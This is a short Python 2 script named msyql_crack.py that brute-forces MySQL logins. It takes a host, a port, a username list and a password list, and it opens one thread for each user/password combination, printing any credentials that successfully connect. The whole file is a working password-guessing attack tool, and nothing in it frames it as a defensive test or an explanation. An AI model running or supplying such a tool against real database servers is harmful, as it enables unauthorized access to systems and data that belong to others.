#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Time   :  18-6-25 上午4:40
# Author :  xiaodong
# File   :  msyql_crack.py

import MySQLdb

import threading

import argparse


def mysqlcrack(hos, por, username, password):
    try:
        connection = MySQLdb.connect(host=hos, user=username, passwd=password, db='mysql', port=por)
        print "succeed user {} pass {}".format(username, password)
    except Exception as e:
        print e


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host', help='host')
    parser.add_argument('port', help='port')
    parser.add_argument('userlist', help='userdic')
    parser.add_argument('passlist', help='passdic')

    args = parser.parse_args()
    hos = args.host

    por = int(args.port)
    userfile = args.userlist
    passfile = args.passlist
    userlst = []
    passlst = []
    ufile = open(userfile, 'r')
    pfile = open(passfile, 'r')

    for line in ufile:
        userlst.append(line.strip())

    for line in pfile:
        passlst.append(line)

    for username in userlst:
        for password in passlst:
            t = threading.Thread(target=mysqlcrack, args=(hos, por, username, password))
            t.start()


if __name__ == "__main__":
    main()